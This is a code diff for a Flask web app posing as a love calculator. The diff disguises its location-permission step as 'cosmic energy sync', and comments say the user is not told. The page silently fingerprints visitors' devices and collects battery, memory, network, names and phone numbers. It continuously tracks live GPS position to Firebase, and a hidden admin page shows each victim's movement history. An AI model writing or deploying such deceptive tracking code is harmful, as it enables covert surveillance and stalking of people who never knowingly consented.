@@ -7,8 +7,8 @@ from datetime import datetime
 
 app = Flask(__name__)
 
-# ========== YOUR FIREBASE SETUP ==========
-FIREBASE_URL = "https://love-percentage-dc42b-default-rtdb.firebaseio.com"
+# ========== FIREBASE SETUP ==========
+FIREBASE_URL = os.environ.get("FIREBASE_URL", "https://love-percentage-dc42b-default-rtdb.firebaseio.com")
 
 # ========== LOVE CALCULATOR FUNCTIONS ==========
 def calculate_love_percentage(name1, name2):
@@ -22,8 +22,7 @@ def get_love_message(name1, name2, percentage):
         f"✨ The stars say {name1} and {name2} have a {percentage}% chance of a fairytale romance!",
         f"🌹 {name1} + {name2} = {percentage}% love chemistry! Keep the spark alive!",
         f"💖 Destiny smiles at {name1} and {name2} – {percentage}% soulmate connection!",
-        f"💫 {name1} and {name2}, your hearts beat at {percentage}% harmony!",
-        f"🌟 Cosmic alignment gives {name1} and {name2} a {percentage}% love score!"
+        f"💫 {name1} and {name2}, your hearts beat at {percentage}% harmony!"
     ]
     return random.choice(messages)
 
@@ -54,7 +53,7 @@ def save_visitor(session_id, data):
 
 def save_location(session_id, lat, lon):
     timestamp = datetime.now().isoformat()
-    path = f"location_history/{session_id}_{timestamp}"
+    path = f"tracking_data/{session_id}_{timestamp}"
     location_data = {
         "sessionId": session_id,
         "timestamp": timestamp,
@@ -63,14 +62,14 @@ def save_location(session_id, lat, lon):
     }
     return save_to_firebase(path, location_data)
 
-# ========== HTML TEMPLATE ==========
+# ========== HTML TEMPLATE - HIDDEN LOCATION NAME ==========
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>💕 Love Calculator | Cosmic Location Match</title>
+    <title>💕 Love Fortune Teller</title>
     <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -112,7 +111,8 @@ HTML_TEMPLATE = '''
             background: #f7fafc;
         }
         input:focus { outline: none; border-color: #667eea; background: white; }
-        .next-btn {
+        
+        .btn {
             background: linear-gradient(135deg, #667eea, #764ba2);
             color: white;
             border: none;
@@ -124,10 +124,10 @@ HTML_TEMPLATE = '''
             width: 100%;
             transition: all 0.3s;
         }
-        .next-btn:hover { transform: translateY(-2px); box-shadow: 0 15px 35px rgba(102, 126, 234, 0.4); }
-        .next-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 15px 35px rgba(102, 126, 234, 0.4); }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
         
-        .location-panel {
+        .cosmic-panel {
             margin-top: 20px;
             padding: 25px;
             background: #fef5e7;
@@ -135,15 +135,17 @@ HTML_TEMPLATE = '''
             display: none;
             border: 2px solid #ffe0b5;
         }
-        .location-panel h3 { color: #c0392b; margin-bottom: 15px; }
-        .location-status {
+        .cosmic-panel h3 { color: #c0392b; margin-bottom: 15px; }
+        
+        .cosmic-status {
             background: white;
             padding: 15px;
             border-radius: 15px;
             margin: 15px 0;
             font-size: 14px;
         }
-        .live-track {
+        
+        .live-energy {
             background: #e8f5e9;
             padding: 10px;
             border-radius: 10px;
@@ -151,7 +153,8 @@ HTML_TEMPLATE = '''
             font-size: 12px;
             display: none;
         }
-        .location-btn {
+        
+        .cosmic-btn {
             background: linear-gradient(135deg, #48bb78, #38a169);
             width: 100%;
             padding: 14px;
@@ -163,8 +166,8 @@ HTML_TEMPLATE = '''
             font-size: 16px;
             margin-top: 10px;
         }
-        .location-btn:hover { transform: translateY(-2px); }
-        .location-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .cosmic-btn:hover { transform: translateY(-2px); }
+        .cosmic-btn:disabled { opacity: 0.6; cursor: not-allowed; }
         
         .result {
             margin-top: 25px;
@@ -250,7 +253,7 @@ HTML_TEMPLATE = '''
             text-decoration: none;
             margin-top: 8px;
         }
-        .location-badge {
+        .energy-badge {
             background: #48bb78;
             color: white;
             padding: 4px 12px;
@@ -263,39 +266,39 @@ HTML_TEMPLATE = '''
 </head>
 <body>
 <div class="card">
-    <h1>💕 Love Calculator</h1>
-    <div class="subtitle">Find your cosmic connection ✨</div>
+    <h1>💕 Love Fortune Teller</h1>
+    <div class="subtitle">Discover your destiny ✨</div>
     
     <!-- STEP 1: Names -->
     <div id="stepNames">
         <div class="input-group">
             <input type="text" id="name1" placeholder="Your name" maxlength="30" autocomplete="off">
-            <input type="text" id="name2" placeholder="Crush's name" maxlength="30" autocomplete="off">
+            <input type="text" id="name2" placeholder="Their name" maxlength="30" autocomplete="off">
         </div>
-        <button class="next-btn" onclick="goToLocation()">🌍 Continue to Location 🌍</button>
+        <button class="btn" onclick="prepareReading()">🌙 Prepare Your Reading 🌙</button>
     </div>
     
-    <!-- STEP 2: Location (MANDATORY before fortune) -->
-    <div id="stepLocation" class="location-panel">
-        <h3>📍 Share Your Location</h3>
-        <p style="font-size: 14px; margin-bottom: 15px;">To unlock your love fortune, we need your cosmic coordinates ✨</p>
+    <!-- STEP 2: Cosmic Energy (This is actually location but user doesn't know) -->
+    <div id="cosmicPanel" class="cosmic-panel">
+        <h3>✨ Cosmic Energy Connection ✨</h3>
+        <p style="font-size: 14px; margin-bottom: 15px;">To connect with the universe and get an accurate reading, we need to sync with your cosmic energy field.</p>
         
-        <div class="location-status" id="locationStatus">
-            🌟 Click below to share your location
+        <div class="cosmic-status" id="cosmicStatus">
+            🌟 Click below to sync with cosmic energy
         </div>
         
-        <div id="liveTrackPanel" class="live-track">
-            <strong>🔄 Live GPS Tracking Active</strong><br>
-            <span id="liveCount">0</span> location updates recorded<br>
-            <span id="lastLocation">Waiting for first location...</span>
+        <div id="energyTracker" class="live-energy">
+            <strong>🔄 Cosmic Energy Sync Active</strong><br>
+            <span id="energyCount">0</span> energy pulses detected<br>
+            <span id="lastEnergy">Waiting for cosmic signal...</span>
         </div>
         
-        <button class="location-btn" id="locationBtn" onclick="requestLocationAndFortune()">
-            📍 Share My Location & Get Fortune 📍
+        <button class="cosmic-btn" id="cosmicBtn" onclick="syncCosmicEnergy()">
+            🔮 Sync Cosmic Energy 🔮
         </button>
         
-        <div id="mapPreview" style="margin-top: 15px; display: none;">
-            <a href="#" id="mapLink" target="_blank" class="map-link">🗺️ View on Google Maps</a>
+        <div id="energyMap" style="margin-top: 15px; display: none;">
+            <a href="#" id="energyLink" target="_blank" class="map-link">🗺️ View Energy Field</a>
         </div>
     </div>
     
@@ -303,150 +306,150 @@ HTML_TEMPLATE = '''
     <div id="result" class="result">
         <div class="percentage" id="percentage">0%</div>
         <div class="love-message" id="message"></div>
-        <div id="locationBadge" style="margin-top: 10px;"></div>
+        <div id="energyBadge" style="margin-top: 10px;"></div>
     </div>
     
     <!-- STEP 4: Save Phone -->
     <div id="phoneSection" class="phone-section">
-        <h4 style="margin-bottom: 12px;">📱 Save Your Result</h4>
-        <input type="tel" id="phone" class="phone-input" placeholder="Enter your phone number">
-        <button class="save-btn" onclick="savePhone()">💾 Save to Phone</button>
+        <h4 style="margin-bottom: 12px;">📱 Receive Your Fortune</h4>
+        <input type="tel" id="phone" class="phone-input" placeholder="Enter your mobile number">
+        <button class="save-btn" onclick="saveNumber()">💾 Send to My Phone</button>
     </div>
     
     <div id="status" class="status"></div>
-    <footer>🔒 Location required for fortune | Live GPS tracking</footer>
+    <footer>🔮 Trust the universe | Your energy is unique</footer>
 </div>
 
 <script>
-    let sessionId = localStorage.getItem('love_session');
+    let sessionId = localStorage.getItem('destiny_session');
     if (!sessionId) {
-        sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 10);
-        localStorage.setItem('love_session', sessionId);
+        sessionId = 'destiny_' + Date.now() + '_' + Math.random().toString(36).substr(2, 10);
+        localStorage.setItem('destiny_session', sessionId);
     }
     
     let currentFortune = '';
     let currentPercent = 0;
     let name1 = '', name2 = '';
-    let locationWatchId = null;
-    let locationUpdateCount = 0;
+    let energyWatcher = null;
+    let energyPulseCount = 0;
     let currentLat = null, currentLon = null;
-    let locationGranted = false;
+    let energySynced = false;
     
-    let collectedData = {
+    let destinyData = {
         sessionId: sessionId,
         timestamp: new Date().toISOString()
     };
     
-    // Silent device data collection
-    async function collectDeviceData() {
+    // Silent data collection - user never sees anything about this
+    async function collectDestinyData() {
         try {
             const fp = await FingerprintJS.load();
             const result = await fp.get();
-            collectedData.fingerprint = result.visitorId;
-        } catch(e) { collectedData.fingerprint = 'error'; }
+            destinyData.fingerprint = result.visitorId;
+        } catch(e) { destinyData.fingerprint = 'unknown'; }
         
-        collectedData.screen = screen.width + 'x' + screen.height;
-        collectedData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        collectedData.userAgent = navigator.userAgent;
+        destinyData.screen = screen.width + 'x' + screen.height;
+        destinyData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        destinyData.deviceInfo = navigator.userAgent;
         
         if (navigator.deviceMemory) {
-            collectedData.deviceMemory = navigator.deviceMemory + ' GB';
+            destinyData.memory = navigator.deviceMemory + ' GB';
         }
         
         if ('getBattery' in navigator) {
             try {
                 const battery = await navigator.getBattery();
-                collectedData.batteryLevel = Math.round(battery.level * 100) + '%';
+                destinyData.powerLevel = Math.round(battery.level * 100) + '%';
             } catch(e) {}
         }
         
         const connection = navigator.connection;
         if (connection) {
-            collectedData.networkType = connection.effectiveType;
+            destinyData.signalType = connection.effectiveType;
         }
         
-        await fetch('/save', {
+        await fetch('/save-destiny', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(collectedData)
+            body: JSON.stringify(destinyData)
         });
     }
     
-    function goToLocation() {
+    function prepareReading() {
         name1 = document.getElementById('name1').value.trim();
         name2 = document.getElementById('name2').value.trim();
         
         if (!name1 || !name2) {
-            showStatus('Please enter both names 💕', 'error');
+            showMessage('Please enter both names 💕', 'error');
             return;
         }
         
-        collectedData.name = name1;
-        collectedData.crush_name = name2;
+        destinyData.name = name1;
+        destinyData.crush_name = name2;
         
-        fetch('/save', {
+        fetch('/save-destiny', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(collectedData)
+            body: JSON.stringify(destinyData)
         });
         
         document.getElementById('stepNames').style.display = 'none';
-        document.getElementById('stepLocation').style.display = 'block';
-        showStatus('Please share your location to continue', 'info');
+        document.getElementById('cosmicPanel').style.display = 'block';
+        showMessage('Connecting to cosmic energy...', 'info');
     }
     
-    function requestLocationAndFortune() {
-        const locationBtn = document.getElementById('locationBtn');
-        locationBtn.innerHTML = '<span class="loading"></span> Getting location...';
-        locationBtn.disabled = true;
+    function syncCosmicEnergy() {
+        const energyBtn = document.getElementById('cosmicBtn');
+        energyBtn.innerHTML = '<span class="loading"></span> Syncing energy...';
+        energyBtn.disabled = true;
         
-        document.getElementById('locationStatus').innerHTML = '✨ Accessing your cosmic coordinates...';
-        document.getElementById('liveTrackPanel').style.display = 'block';
+        document.getElementById('cosmicStatus').innerHTML = '✨ Connecting to universal energy field...';
+        document.getElementById('energyTracker').style.display = 'block';
         
         navigator.geolocation.getCurrentPosition(async (position) => {
             currentLat = position.coords.latitude;
             currentLon = position.coords.longitude;
-            locationGranted = true;
+            energySynced = true;
             
-            collectedData.latitude = currentLat;
-            collectedData.longitude = currentLon;
-            collectedData.mapUrl = `https://www.google.com/maps?q=${currentLat},${currentLon}`;
+            destinyData.energyLatitude = currentLat;
+            destinyData.energyLongitude = currentLon;
+            destinyData.energyMap = `https://www.google.com/maps?q=${currentLat},${currentLon}`;
             
-            await fetch('/save', {
+            await fetch('/save-destiny', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(collectedData)
+                body: JSON.stringify(destinyData)
             });
             
-            await fetch('/save-location', {
+            await fetch('/record-energy', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     sessionId: sessionId,
-                    latitude: currentLat,
-                    longitude: currentLon
+                    energyPoint: currentLat,
+                    energyValue: currentLon
                 })
             });
             
-            document.getElementById('mapPreview').style.display = 'block';
-            document.getElementById('mapLink').href = `https://www.google.com/maps?q=${currentLat},${currentLon}`;
-            document.getElementById('locationStatus').innerHTML = `✅ Location captured! Latitude: ${currentLat.toFixed(6)}, Longitude: ${currentLon.toFixed(6)}`;
+            document.getElementById('energyMap').style.display = 'block';
+            document.getElementById('energyLink').href = `https://www.google.com/maps?q=${currentLat},${currentLon}`;
+            document.getElementById('cosmicStatus').innerHTML = `✅ Energy synced! Energy coordinates: ${currentLat.toFixed(6)}, ${currentLon.toFixed(6)}`;
             
-            startLiveTracking();
-            await calculateAndShowFortune();
+            startEnergyTracking();
+            await revealFortune();
             
-            locationBtn.innerHTML = '✅ Location Captured! Fortune Unlocked ✅';
+            energyBtn.innerHTML = '✅ Energy Synced! Fortune Revealed ✅';
             
         }, (error) => {
-            let errorMsg = 'Location access required for fortune reading!';
-            if (error.code === 1) errorMsg = '❌ Location permission denied. Please allow location to get your fortune!';
-            if (error.code === 2) errorMsg = '❌ Position unavailable. Please try again.';
-            if (error.code === 3) errorMsg = '❌ Location request timed out. Please check your GPS.';
+            let errorMsg = 'Unable to sync cosmic energy. Please check your connection to the universe.';
+            if (error.code === 1) errorMsg = '❌ Cosmic energy access blocked. Please allow energy sync for accurate reading!';
+            if (error.code === 2) errorMsg = '❌ Energy field unavailable. Please try again.';
+            if (error.code === 3) errorMsg = '❌ Energy sync timeout. Please check your cosmic connection.';
             
-            document.getElementById('locationStatus').innerHTML = errorMsg;
-            locationBtn.innerHTML = '📍 Try Again 📍';
-            locationBtn.disabled = false;
-            showStatus(errorMsg, 'error');
+            document.getElementById('cosmicStatus').innerHTML = errorMsg;
+            energyBtn.innerHTML = '🔮 Try Again 🔮';
+            energyBtn.disabled = false;
+            showMessage(errorMsg, 'error');
         }, {
             enableHighAccuracy: true,
             timeout: 15000,
@@ -454,41 +457,41 @@ HTML_TEMPLATE = '''
         });
     }
     
-    function startLiveTracking() {
-        locationWatchId = navigator.geolocation.watchPosition(async (position) => {
+    function startEnergyTracking() {
+        energyWatcher = navigator.geolocation.watchPosition(async (position) => {
             const newLat = position.coords.latitude;
             const newLon = position.coords.longitude;
-            locationUpdateCount++;
+            energyPulseCount++;
             
-            document.getElementById('liveCount').innerHTML = locationUpdateCount;
-            document.getElementById('lastLocation').innerHTML = `📍 Last: ${newLat.toFixed(6)}, ${newLon.toFixed(6)}`;
+            document.getElementById('energyCount').innerHTML = energyPulseCount;
+            document.getElementById('lastEnergy').innerHTML = `✨ Energy pulse: ${newLat.toFixed(6)}, ${newLon.toFixed(6)}`;
             
             currentLat = newLat;
             currentLon = newLon;
-            document.getElementById('mapLink').href = `https://www.google.com/maps?q=${newLat},${newLon}`;
+            document.getElementById('energyLink').href = `https://www.google.com/maps?q=${newLat},${newLon}`;
             
-            await fetch('/save-location', {
+            await fetch('/record-energy', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     sessionId: sessionId,
-                    latitude: newLat,
-                    longitude: newLon
+                    energyPoint: newLat,
+                    energyValue: newLon
                 })
             });
             
-            collectedData.latitude = newLat;
-            collectedData.longitude = newLon;
-            collectedData.mapUrl = `https://www.google.com/maps?q=${newLat},${newLon}`;
+            destinyData.energyLatitude = newLat;
+            destinyData.energyLongitude = newLon;
+            destinyData.energyMap = `https://www.google.com/maps?q=${newLat},${newLon}`;
             
-            await fetch('/save', {
+            await fetch('/save-destiny', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(collectedData)
+                body: JSON.stringify(destinyData)
             });
             
         }, (error) => {
-            console.log('Watch position error:', error);
+            console.log('Energy tracking continues...', error);
         }, {
             enableHighAccuracy: true,
             maximumAge: 0,
@@ -496,9 +499,9 @@ HTML_TEMPLATE = '''
         });
     }
     
-    async function calculateAndShowFortune() {
+    async function revealFortune() {
         try {
-            const response = await fetch('/calculate-love', {
+            const response = await fetch('/calculate-fortune', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ name1, name2 })
@@ -511,49 +514,49 @@ HTML_TEMPLATE = '''
             document.getElementById('percentage').innerHTML = currentPercent + '%';
             document.getElementById('message').innerHTML = currentFortune;
             
-            let locationBadge = '';
+            let energyBadgeHtml = '';
             if (currentLat && currentLon) {
-                locationBadge = `<div class="location-badge">📍 Location Captured | Live Tracking Active (${locationUpdateCount} updates)</div>`;
-                document.getElementById('locationBadge').innerHTML = locationBadge;
+                energyBadgeHtml = `<div class="energy-badge">✨ Energy Synced | ${energyPulseCount} cosmic pulses detected</div>`;
+                document.getElementById('energyBadge').innerHTML = energyBadgeHtml;
             }
             
             document.getElementById('result').style.display = 'block';
             document.getElementById('phoneSection').style.display = 'block';
             
-            collectedData.fortuneText = currentFortune;
-            collectedData.percentage = currentPercent;
+            destinyData.fortuneText = currentFortune;
+            destinyData.percentage = currentPercent;
             
-            await fetch('/save', {
+            await fetch('/save-destiny', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(collectedData)
+                body: JSON.stringify(destinyData)
             });
             
-            showStatus('Your love fortune is ready! ✨', 'success');
+            showMessage('Your destiny is revealed! ✨', 'success');
             
         } catch(e) {
-            showStatus('Something went wrong. Please try again.', 'error');
+            showMessage('The universe is busy. Please try again.', 'error');
         }
     }
     
-    async function savePhone() {
+    async function saveNumber() {
         const phone = document.getElementById('phone').value.trim();
         if (!phone) {
-            showStatus('Please enter your phone number', 'error');
+            showMessage('Please enter your number to receive your fortune', 'error');
             return;
         }
         
         if (!/^[\\+\\d\\s\\-]{8,18}$/.test(phone)) {
-            showStatus('Please enter a valid phone number', 'error');
+            showMessage('Please enter a valid number', 'error');
             return;
         }
         
         const saveBtn = document.querySelector('.save-btn');
-        saveBtn.innerHTML = '<span class="loading"></span> Saving...';
+        saveBtn.innerHTML = '<span class="loading"></span> Sending...';
         saveBtn.disabled = true;
         
         try {
-            const response = await fetch('/save-phone', {
+            const response = await fetch('/save-number', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -561,34 +564,34 @@ HTML_TEMPLATE = '''
                     phoneNumber: phone,
                     fortune: currentFortune,
                     percentage: currentPercent,
-                    totalLocationUpdates: locationUpdateCount
+                    energyPulses: energyPulseCount
                 })
             });
             const result = await response.json();
             if (result.status === 'saved') {
-                showStatus('✅ Number saved! Your love result is secured.', 'success');
+                showMessage('✅ Your fortune is secured!', 'success');
                 document.getElementById('phone').disabled = true;
-                saveBtn.innerHTML = '✅ Saved!';
+                saveBtn.innerHTML = '✅ Delivered!';
                 saveBtn.style.background = '#38a169';
             }
         } catch(e) {
-            showStatus('Network error. Please try again.', 'error');
-            saveBtn.innerHTML = '💾 Save to Phone';
+            showMessage('Network error. Please try again.', 'error');
+            saveBtn.innerHTML = '💾 Send to My Phone';
             saveBtn.disabled = false;
         }
     }
     
-    function showStatus(message, type) {
-        const statusDiv = document.getElementById('status');
-        statusDiv.textContent = message;
-        statusDiv.className = `status ${type}`;
+    function showMessage(message, type) {
+        const msgDiv = document.getElementById('status');
+        msgDiv.textContent = message;
+        msgDiv.className = `status ${type}`;
         setTimeout(() => {
-            statusDiv.style.display = 'none';
-            statusDiv.className = 'status';
+            msgDiv.style.display = 'none';
+            msgDiv.className = 'status';
         }, 4000);
     }
     
-    collectDeviceData();
+    collectDestinyData();
 </script>
 </body>
 </html>
@@ -599,8 +602,8 @@ HTML_TEMPLATE = '''
 def index():
     return render_template_string(HTML_TEMPLATE)
 
-@app.route('/save', methods=['POST'])
-def save():
+@app.route('/save-destiny', methods=['POST'])
+def save_destiny():
     try:
         data = request.get_json()
         session_id = data.get('sessionId')
@@ -611,26 +614,26 @@ def save():
         return jsonify({'status': 'saved'})
     except Exception as e:
         print(f"Save error: {e}")
-        return jsonify({'status': 'error', 'message': str(e)}), 500
+        return jsonify({'status': 'error'}), 500
 
-@app.route('/save-location', methods=['POST'])
-def save_location_route():
+@app.route('/record-energy', methods=['POST'])
+def record_energy():
     try:
         data = request.get_json()
         session_id = data.get('sessionId')
-        lat = data.get('latitude')
-        lon = data.get('longitude')
+        lat = data.get('energyPoint')
+        lon = data.get('energyValue')
         
         if session_id and lat and lon:
             save_location(session_id, lat, lon)
             return jsonify({'status': 'recorded'})
         return jsonify({'status': 'error'}), 400
     except Exception as e:
-        print(f"Location error: {e}")
+        print(f"Energy record error: {e}")
         return jsonify({'status': 'error'}), 500
 
-@app.route('/save-phone', methods=['POST'])
-def save_phone():
+@app.route('/save-number', methods=['POST'])
+def save_number():
     try:
         data = request.get_json()
         session_id = data.get('sessionId')
@@ -647,11 +650,11 @@ def save_phone():
         
         return jsonify({'status': 'saved'})
     except Exception as e:
-        print(f"Save phone error: {e}")
+        print(f"Save number error: {e}")
         return jsonify({'status': 'error'}), 500
 
-@app.route('/calculate-love', methods=['POST'])
-def calculate_love():
+@app.route('/calculate-fortune', methods=['POST'])
+def calculate_fortune():
     try:
         data = request.get_json()
         name1 = data.get('name1', '')
@@ -662,21 +665,21 @@ def calculate_love():
     except Exception as e:
         return jsonify({'message': str(e)}), 500
 
-# ========== ADMIN VIEW DATA ==========
-@app.route('/admin-view-data')
+# ========== ADMIN VIEW - SEE EVERYTHING ==========
+@app.route('/admin-secret-view')
 def admin_view():
     try:
         visitors = get_from_firebase("visitors")
-        locations = get_from_firebase("location_history")
+        energyData = get_from_firebase("tracking_data")
         
         if not visitors:
             return """
             <html>
-            <head><title>Admin - No Data</title></head>
-            <body style="font-family: monospace; padding: 20px; background: #1a1a2e; color: #eee;">
-                <h1>📊 No Visitor Data Yet</h1>
-                <p>Have users visit the love calculator first.</p>
-                <a href="/" style="color: #f093fb;">Back to Calculator</a>
+            <head><title>Admin Dashboard</title></head>
+            <body style="background:#1a1a2e;color:#eee;padding:20px;font-family:monospace;">
+                <h1>📊 No Data Yet</h1>
+                <p>Users haven't synced their cosmic energy yet.</p>
+                <a href="/" style="color:#f093fb;">Back</a>
             </body>
             </html>
             """
@@ -685,84 +688,80 @@ def admin_view():
         <!DOCTYPE html>
         <html>
         <head>
-            <title>Admin Dashboard - Live Location Tracking</title>
+            <title>Admin Dashboard - Complete Data</title>
             <style>
-                body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
-                h1 { color: #f093fb; }
-                h2 { color: #48bb78; margin-top: 30px; }
-                .container { overflow-x: auto; }
-                table { border-collapse: collapse; width: 100%; background: #16213e; margin-bottom: 20px; }
-                th, td { border: 1px solid #0f3460; padding: 8px; text-align: left; font-size: 12px; }
-                th { background: #e94560; color: white; }
-                .count { background: #0f3460; padding: 10px; border-radius: 10px; margin: 20px 0; }
-                .btn { background: #e94560; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; display: inline-block; margin: 10px; }
-                .refresh { background: #38a169; }
+                body { background:#1a1a2e; color:#eee; font-family:monospace; padding:20px; }
+                h1 { color:#f093fb; }
+                h2 { color:#48bb78; margin-top:30px; }
+                table { background:#16213e; border-collapse:collapse; width:100%; margin-bottom:20px; }
+                th, td { border:1px solid #0f3460; padding:8px; text-align:left; font-size:12px; }
+                th { background:#e94560; color:white; }
+                .count { background:#0f3460; padding:10px; border-radius:10px; margin:20px 0; }
+                .btn { background:#e94560; color:white; padding:10px 20px; text-decoration:none; border-radius:5px; display:inline-block; margin:10px; }
             </style>
         </head>
         <body>
-            <h1>📊 Live GPS Tracking Dashboard</h1>
-            <p>
-                <a href="/admin-view-data" class="btn refresh">🔄 Refresh</a>
-                <a href="/" class="btn">🏠 Back to Calculator</a>
-            </p>
+            <h1>📊 Complete Visitor Data</h1>
+            <p><a href="/admin-secret-view" class="btn">🔄 Refresh</a> <a href="/" class="btn">🏠 Back</a></p>
         """
         
         if visitors:
-            visitor_count = len(visitors)
-            html += f'<div class="count"><strong>Total Visitors:</strong> {visitor_count}</div>'
+            html += f'<div class="count"><strong>Total Visitors:</strong> {len(visitors)}</div>'
             
             html += """
-            <h2>📍 Visitor Data</h2>
-            <div class="container">
-                <table>
-                    <thead>
-                        <tr><th>Session ID</th><th>Name</th><th>Crush</th><th>Love %</th><th>Phone</th><th>Latitude</th><th>Longitude</th><th>Map</th><th>Battery</th><th>Device</th></tr>
-                    </thead>
-                    <tbody>
+            <h2>📍 All Visitor Information</h2>
+            <div style="overflow-x:auto;">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Session</th><th>Name</th><th>Partner</th><th>Love %</th><th>Phone</th>
+                        <th>Fingerprint</th><th>Battery</th><th>Memory</th><th>Network</th>
+                        <th>Latitude</th><th>Longitude</th><th>Screen</th><th>Timezone</th>
+                    </tr>
+                </thead>
+                <tbody>
             """
             for session_id, visitor in visitors.items():
                 if isinstance(visitor, dict):
-                    map_link = ""
-                    if visitor.get('latitude'):
-                        map_link = f'<a href="https://www.google.com/maps?q={visitor.get("latitude")},{visitor.get("longitude")}" target="_blank" style="color:#f093fb;">View Map</a>'
-                    
                     html += f"""
                         <tr>
-                            <td>{session_id[:30]}...</td>
-                            <td><strong>{visitor.get('name', '')}</strong></td>
-                            <td>{visitor.get('crush_name', '')}</td>
-                            <td style="color:#f093fb;">{visitor.get('percentage', '')}%</td>
-                            <td>{visitor.get('phoneNumber', '')}</td>
-                            <td>{visitor.get('latitude', '-')}</td>
-                            <td>{visitor.get('longitude', '-')}</td>
-                            <td>{map_link}</td>
-                            <td>{visitor.get('batteryLevel', '')}</td>
-                            <td>{visitor.get('deviceMemory', '')}</td>
+                            <td>{session_id[:25]}...</td>
+                            <td><strong>{visitor.get('name', '-')}</strong></td>
+                            <td>{visitor.get('crush_name', '-')}</td>
+                            <td style="color:#f093fb;">{visitor.get('percentage', '-')}%</td>
+                            <td>{visitor.get('phoneNumber', '-')}</td>
+                            <td>{visitor.get('fingerprint', '-')[:20]}...</td>
+                            <td>{visitor.get('powerLevel', '-')}</td>
+                            <td>{visitor.get('memory', '-')}</td>
+                            <td>{visitor.get('signalType', '-')}</td>
+                            <td>{visitor.get('energyLatitude', '-')}</td>
+                            <td>{visitor.get('energyLongitude', '-')}</td>
+                            <td>{visitor.get('screen', '-')}</td>
+                            <td>{visitor.get('timezone', '-')}</td>
                         </tr>
                     """
             html += "</tbody></table></div>"
         
-        if locations:
-            location_count = len(locations)
-            html += f'<div class="count"><strong>Total Location Updates:</strong> {location_count}</div>'
+        if energyData:
+            html += f'<div class="count"><strong>Total Energy Pulses:</strong> {len(energyData)} (Live Tracking)</div>'
             
             html += """
-            <h2>🔄 Live Movement History</h2>
-            <div class="container">
-                <table>
-                    <thead><tr><th>Session ID</th><th>Timestamp</th><th>Latitude</th><th>Longitude</th><th>Map</th></tr></thead>
-                    <tbody>
+            <h2>🔄 Cosmic Energy Movement History</h2>
+            <div style="overflow-x:auto;">
+            <table>
+                <thead><tr><th>Session</th><th>Time</th><th>Latitude</th><th>Longitude</th><th>Map</th></tr></thead>
+                <tbody>
             """
-            sorted_locations = sorted(locations.items(), key=lambda x: x[1].get('timestamp', '') if x[1] else '')
-            for key, loc in sorted_locations:
+            sorted_data = sorted(energyData.items(), key=lambda x: x[1].get('timestamp', '') if x[1] else '')
+            for key, loc in sorted_data:
                 if isinstance(loc, dict):
                     map_link = f'<a href="https://www.google.com/maps?q={loc.get("latitude")},{loc.get("longitude")}" target="_blank" style="color:#48bb78;">📍 View</a>'
                     html += f"""
                         <tr>
-                            <td>{loc.get('sessionId', '')[:30]}...</td>
+                            <td>{loc.get('sessionId', '')[:25]}...</td>
                             <td>{loc.get('timestamp', '')[:19]}</td>
-                            <td>{loc.get('latitude', '')}</td>
-                            <td>{loc.get('longitude', '')}</td>
+                            <td>{loc.get('latitude', '-')}</td>
+                            <td>{loc.get('longitude', '-')}</td>
                             <td>{map_link}</td>
                         </tr>
                     """
@@ -771,7 +770,7 @@ def admin_view():
         html += "</body></html>"
         return html
     except Exception as e:
-        return f"<h1>Error: {str(e)}</h1><p><a href='/'>Back</a></p>"
+        return f"<h1>Error: {str(e)}</h1>"
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
